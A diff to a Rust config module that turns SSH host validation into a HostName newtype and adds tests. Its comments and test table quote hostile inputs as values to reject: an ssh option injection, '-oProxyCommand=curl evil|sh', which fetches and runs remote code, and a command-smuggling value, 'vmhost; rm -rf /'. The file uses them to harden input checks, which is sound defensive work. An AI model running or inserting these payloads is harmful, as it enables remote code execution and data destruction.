@@ -7,16 +7,16 @@
 //! that.
 //!
 //! `super::registry` reads the file; [`rank`] picks between the
-//! two keys in a copy it is handed. Both keys have already been
-//! checked by then: `super::registry`'s parse applies
-//! [`refuse_if_bad`] to every `host` in the file as it reads it,
-//! whether or not the run turns out to want that one, and its
-//! header says why. So holding a `Registry` is the proof that
-//! every host in it passed, and nothing downstream runs the
-//! rule again.
+//! two keys in a copy it is handed, and builds the winner into a
+//! [`HostName`]. Both keys have already been checked by then:
+//! `super::registry`'s parse applies [`refuse_if_bad`] to every
+//! `host` in the file as it reads it, whether or not the run
+//! turns out to want that one, and its header says why. So
+//! holding a `Registry` is the proof that every host in it
+//! passed.
 //!
-//! What is wrong with a host value is decided in one place,
-//! [`host_problem`], so the message an operator gets does not
+//! What a host value may be is decided in one place,
+//! [`HostName::parse`], so the message an operator gets does not
 //! depend on which key carried the value.
 //!
 //! # Why the config directory is decided here
@@ -27,6 +27,7 @@
 //! the VM host out of whatever repository bombyx was run in,
 //! which is the one thing this design removes.
 
+use std::fmt;
 use std::path::{Path, PathBuf};
 
 use super::error::FieldError;
@@ -50,89 +51,133 @@ pub(crate) fn is_host_char(c: char) -> bool {
 /// of the real one.
 pub const CONFIG_DIR_ENV: &str = "BOMBYX_CONFIG_HOME";
 
-/// What is wrong with a host value.
+/// The machine bombyx runs `vagrant` on, as an SSH destination.
 ///
-/// This type deliberately carries no field name.
-/// [`FieldError`] does carry one, and for every other config
-/// value that name answers the operator's question, "which key
-/// do I edit?". For `host` it does not: the registry has a
-/// `host` key per project and one more below them all, so the
-/// field name identifies none of them. The useful answer is the
-/// *source*, which [`refuse_if_bad`] takes as a [`HostOrigin`]
-/// and attaches.
-pub(crate) enum HostProblem {
-    /// Blank, so no host at all.
-    Empty,
-    /// Present but outside the allowed shape.
-    Invalid(String),
-}
+/// This is a *newtype*: a struct wrapping one `String`, where
+/// the `String` inside is private. You cannot build one
+/// directly. You have to call [`HostName::parse`], which applies
+/// the three rules first. So holding a `HostName` is the proof
+/// that they ran.
+///
+/// The field it fills, `super::Config::host`, is public, so a
+/// checking function would leave every assignment to that field
+/// free to skip it. The value becomes `ssh`'s first positional
+/// argument, and `ssh` honours no `--`, so one starting with
+/// `-` is an option rather than a destination.
+///
+/// **There is deliberately no `#[serde(try_from = "String")]`**,
+/// unlike [`super::RemoteRoot`] and [`super::RepoUrl`]. The
+/// registry has a `host` key per project and one more below them
+/// all, so the field name `host` names none of them. `checked`
+/// takes a [`HostOrigin`] and says which line to edit instead,
+/// and serde cannot supply one because it does not know which
+/// key it is reading. `super::registry`'s parse applies the rule
+/// to every `host` in the file, and `rank` builds the winner.
+/// (Neither is linked: both are private, and rustdoc refuses a
+/// public page pointing at a private item.)
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct HostName(String);
 
-impl From<FieldError> for HostProblem {
-    /// Drops the field name the guards attach.
+impl HostName {
+    /// Applies the three rules to `raw` and wraps it.
     ///
-    /// Every guard is written to name a field, because most
-    /// callers want that. `host` is the exception, so the name
-    /// is discarded here and the caller supplies the source
-    /// instead.
-    fn from(err: FieldError) -> Self {
-        match err {
-            FieldError::Empty { .. } => Self::Empty,
-            FieldError::Invalid { reason, .. } => Self::Invalid(reason),
-        }
+    /// All three come from `super::guards`, so widening one
+    /// there widens it here too.
+    ///
+    /// The leading-dash rule is the one worth spelling out.
+    /// `host` reaches `ssh` as its first positional argument,
+    /// and `ssh` does not honour a `--` end-of-options
+    /// separator, so a leading `-` is read as an option:
+    /// `-oProxyCommand=curl evil|sh` runs code on this
+    /// workstation from a bare `bombyx status`, before any
+    /// network traffic.
+    ///
+    /// # Errors
+    ///
+    /// Returns [`FieldError::Empty`] when `raw` is blank, and
+    /// [`FieldError::Invalid`] when it starts with `-` or holds
+    /// a character outside the allowed set: letters, digits,
+    /// `.`, `_`, `-` and `@`.
+    pub fn parse(raw: &str) -> Result<Self, FieldError> {
+        guards::check_not_empty("host", raw)?;
+        guards::check_not_an_option("host", raw, "ssh")?;
+        guards::check_charset(
+            "host",
+            raw,
+            is_host_char,
+            "letters, digits, `.`, `_`, `-` or `@`",
+        )?;
+        Ok(Self(raw.to_owned()))
+    }
+
+    /// The value, as `ssh` sees it.
+    #[must_use]
+    pub fn as_str(&self) -> &str {
+        &self.0
     }
 }
 
-/// Checks a host value, whatever supplied it.
-///
-/// It applies three rules, and all three come from
-/// `super::guards`, so widening one there widens it here too.
-///
-/// The leading-dash rule is the one worth spelling out. `host`
-/// reaches `ssh` as its first positional argument, and `ssh`
-/// does not honour a `--` end-of-options separator, so a
-/// leading `-` is read as an option:
-/// `-oProxyCommand=curl evil|sh` runs code on this workstation
-/// from a bare `bombyx status`, before any network traffic.
-pub(crate) fn host_problem(value: &str) -> Option<HostProblem> {
-    guards::check_not_empty("host", value)
-        .and_then(|()| guards::check_not_an_option("host", value, "ssh"))
-        .and_then(|()| {
-            guards::check_charset(
-                "host",
-                value,
-                is_host_char,
-                "letters, digits, `.`, `_`, `-` or `@`",
-            )
-        })
-        .err()
-        .map(HostProblem::from)
+impl fmt::Display for HostName {
+    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+        f.write_str(&self.0)
+    }
 }
 
-/// Refuses `value` if [`host_problem`] finds anything wrong,
-/// naming its source rather than a field -- two keys, two
-/// answers to "which line do I edit?".
+impl AsRef<str> for HostName {
+    fn as_ref(&self) -> &str {
+        &self.0
+    }
+}
+
+/// Builds a [`HostName`] from `value`, naming its source rather
+/// than a field when it is refused.
+///
+/// [`FieldError`] carries a field name, and for every other
+/// config value that name answers the operator's question,
+/// "which key do I edit?". For `host` it does not: the registry
+/// has a `host` key per project and one more below them all, so
+/// `host` identifies none of them. The useful answer is the
+/// source, which the caller supplies as a [`HostOrigin`], so
+/// the name is dropped here and the origin put in its place.
+///
+/// [`FieldError::Empty`] carries only a field name and no
+/// reason, so a fixed sentence stands in for one.
 ///
 /// # Errors
 ///
 /// Returns [`ConfigError::InvalidHost`], naming the source and
 /// the reason.
+pub(crate) fn checked(
+    value: &str,
+    origin: &HostOrigin,
+    path: Option<&Path>,
+) -> Result<HostName, ConfigError> {
+    HostName::parse(value).map_err(|err| ConfigError::InvalidHost {
+        origin: origin.describe(path),
+        reason: match err {
+            FieldError::Empty { .. } => "must not be empty".to_owned(),
+            FieldError::Invalid { reason, .. } => reason,
+        },
+    })
+}
+
+/// Refuses `value` if it is not a legal host, throwing the
+/// [`HostName`] away.
+///
+/// `super::registry`'s parse checks every `host` in the file,
+/// including the ones no run will want, and has nowhere to keep
+/// them: an entry's `host` stays in the entry as the table
+/// spelled it, and [`rank`] builds the winner later.
+///
+/// # Errors
+///
+/// Whatever [`checked`] returns.
 pub(crate) fn refuse_if_bad(
     value: &str,
     origin: &HostOrigin,
     path: Option<&Path>,
 ) -> Result<(), ConfigError> {
-    let Some(problem) = host_problem(value) else {
-        return Ok(());
-    };
-    Err(ConfigError::InvalidHost {
-        origin: origin.describe(path),
-        reason: match problem {
-            // `HostProblem` carries no field name, so the empty
-            // case has no reason attached and gets one here.
-            HostProblem::Empty => "must not be empty".to_owned(),
-            HostProblem::Invalid(reason) => reason,
-        },
-    })
+    checked(value, origin, path).map(|_| ())
 }
 
 /// Whether an environment-supplied directory is safe to use.
@@ -312,22 +357,31 @@ impl HostOrigin {
 /// file edited between two reads could supply a project host and
 /// a file-wide host that never coexisted.
 ///
-/// Both values arrive checked, and `super::registry`'s parse is
-/// what checked them. Nothing here runs the rule again.
+/// This is where the winner becomes a [`HostName`]. Both values
+/// arrive checked -- `super::registry`'s parse is what checked
+/// them -- so [`refuse_if_bad`] here is the second of two
+/// passes and cannot fail today. It runs anyway, because this
+/// function would otherwise depend on a rule applied in another
+/// module, and a `Registry` built some future way would hand an
+/// unchecked name straight to `ssh`.
 ///
 /// # Errors
 ///
 /// Returns [`ConfigError::HostMissing`] when neither key names a
-/// host.
+/// host, and [`ConfigError::InvalidHost`] if a value reaches
+/// here that `super::registry`'s parse did not refuse.
 pub(crate) fn rank(
     registry: &registry::Registry,
     name: &str,
-) -> Result<(String, HostOrigin), ConfigError> {
+) -> Result<(HostName, HostOrigin), ConfigError> {
+    let path = Some(registry.path());
     if let Some((key, host)) = registry.project_host(name) {
-        return Ok((host.to_owned(), HostOrigin::ProjectEntry(key.clone())));
+        let origin = HostOrigin::ProjectEntry(key.clone());
+        return Ok((checked(host, &origin, path)?, origin));
     }
     if let Some(host) = registry.host() {
-        return Ok((host.to_owned(), HostOrigin::UserFile));
+        let origin = HostOrigin::UserFile;
+        return Ok((checked(host, &origin, path)?, origin));
     }
     Err(ConfigError::HostMissing {
         place: super::read::path_display(registry.path()),
@@ -362,4 +416,48 @@ pub(crate) fn registry_place(path: Option<&Path>) -> String {
         || format!("a {USER_CONFIG_FILE} in your config directory"),
         super::read::path_display,
     )
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn the_whole_family_of_bad_hosts_is_refused() {
+        // The registry tests apply the same table through the
+        // file, which is the seam. This applies it to the
+        // constructor, which is the type's own promise: a
+        // `HostName` that exists is one that passed.
+        //
+        // `-oProxyCommand=...` is the case that matters most.
+        // `ssh` honours no `--`, so this reaches it as an option
+        // naming a program to run, from a bare `bombyx status`.
+        for (bad, reason) in [
+            ("", "must not be empty"),
+            ("   ", "must not be empty"),
+            ("-oProxyCommand=curl evil|sh", "must not start with"),
+            ("vm host", "letters, digits"),
+            ("vmhost; rm -rf /", "letters, digits"),
+            ("vmhost\n", "letters, digits"),
+        ] {
+            let err = HostName::parse(bad).expect_err("must be refused");
+            assert!(
+                err.to_string().contains(reason),
+                "{bad:?}: want {reason:?}, got {err}"
+            );
+        }
+    }
+
+    #[test]
+    fn the_spellings_operators_write_are_kept() {
+        // An alias out of `~/.ssh/config`, and the `user@host`
+        // form for a machine with no entry there.
+        for good in ["vmhost", "vm-host.local", "dev@192.0.2.7", "a_b"] {
+            let host = HostName::parse(good)
+                .unwrap_or_else(|e| panic!("{good:?}: {e}"));
+            assert_eq!(host.as_str(), good);
+            assert_eq!(host.to_string(), good);
+            assert_eq!(host.as_ref(), good);
+        }
+    }
 }
